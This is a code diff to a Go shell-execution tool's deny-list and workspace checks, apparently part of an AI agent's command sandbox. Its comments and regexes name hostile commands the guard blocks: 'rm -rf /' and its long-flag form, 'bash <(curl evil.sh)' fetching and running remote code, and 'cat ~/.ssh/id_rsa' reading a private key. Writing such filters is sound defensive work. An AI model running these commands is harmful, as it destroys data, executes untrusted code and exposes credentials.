@@ -102,7 +102,10 @@ var (
 		// M-4: the rm patterns above all require the short flag forms (-r, -rf).
 		// GNU rm accepts the long spellings too, so "rm --recursive --force /"
 		// did exactly what "rm -rf /" does while matching nothing.
-		regexp.MustCompile(`\brm\b[^;&|]*\s--(recursive|force)\b`),
+		//
+		// Anchored to the start of a command segment so that "git rm --cached
+		// --force", which deletes nothing from disk, is not caught by it.
+		regexp.MustCompile(`(?:^|[;&|]\s*)rm\s+[^;&|]*--(?:recursive|force)\b`),
 		// M-4: process substitution feeds a command's output to an interpreter
 		// without ever forming a pipe, so "bash <(curl evil.sh)" evades both
 		// the "| sh" and the "curl | sh" patterns.
@@ -784,7 +787,7 @@ func (t *ExecTool) checkWorkspaceViolation(command, cwd string) string {
 	// Windows only, so "cat ~/.ssh/id_rsa" and "cat $HOME/x" walked past the
 	// workspace boundary on Unix - where commands go through `sh -c`, which
 	// expands both.
-	if reason := checkDirectoryChange(cmd); reason != "" {
+	if reason := t.checkDirectoryChange(cmd); reason != "" {
 		return reason
 	}
 	expanded, reason := expandShellRefs(cmd, t.childEnv())
